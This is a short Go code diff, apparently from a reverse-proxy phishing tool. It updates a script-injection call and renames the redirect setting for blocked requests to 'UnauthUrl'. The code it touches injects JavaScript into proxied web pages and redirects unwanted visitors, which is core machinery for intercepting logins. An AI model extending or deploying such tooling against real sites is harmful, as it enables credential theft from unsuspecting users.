@@ -960,7 +960,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								js_params = &s.Params
 							}
 							//log.Debug("js_inject: hostname:%s path:%s", req_hostname, resp.Request.URL.Path)
-							script, err := pl.GetScriptInject(req_hostname, resp.Request.URL.Path, js_params)
+							script, _, err := pl.GetScriptInject(req_hostname, resp.Request.URL.Path, js_params)
 							if err == nil {
 								//log.Debug("js_inject: matched %s%s - injecting script", req_hostname, resp.Request.URL.Path)
 								js_nonce_re := regexp.MustCompile(`(?i)<script.*nonce=['"]([^'"]*)`)
@@ -1033,8 +1033,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 }
 
 func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Response) {
-	if len(p.cfg.general.RedirectUrl) > 0 {
-		redirect_url := p.cfg.general.RedirectUrl
+	if len(p.cfg.general.UnauthUrl) > 0 {
+		redirect_url := p.cfg.general.UnauthUrl
 		resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
 		if resp != nil {
 			resp.Header.Add("Location", redirect_url)
